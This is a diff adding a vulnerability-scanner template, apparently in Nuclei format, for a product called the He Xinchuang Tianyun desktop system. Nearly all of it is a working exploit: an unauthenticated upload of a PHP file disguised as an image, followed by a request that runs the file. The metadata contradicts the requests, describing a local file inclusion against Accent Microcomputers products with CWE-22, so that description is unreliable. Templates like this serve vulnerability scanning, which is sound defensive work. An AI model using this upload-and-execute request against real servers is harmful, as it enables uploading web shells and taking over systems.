@@ -1,0 +1,42 @@
+id: He-Xinchuang-Tianyun-desktop-system
+
+info:
+  name: He Xinchuang Tianyun desktop system
+  author: momika233
+  severity: high
+  description: A local file inclusion vulnerability in Accent Microcomputers offerings could allow remote attackers to retrieve password files.
+  reference:
+    - https://www.github.com/momika233
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+    cvss-score: 8.6
+    cwe-id: CWE-22
+  tags: He_Xinchuang_Tianyun_desktop_system,RCE
+
+requests:
+  - raw:
+      - |
+        POST /Upload/upload_file.php?l=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv
+        Content-Length: 180
+
+        ------WebKitFormBoundaryfcKRltGv
+        Content-Disposition: form-data; name="file"; filename="1.php"
+        Content-Type: image/avif
+
+        <?php phpinfo(); ?>
+        ------WebKitFormBoundaryfcKRltGv--
+      - |
+        GET /Upload/1/1.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<title>phpinfo()"
+        part: body
+
+      - type: status
+        status:
+          - 200
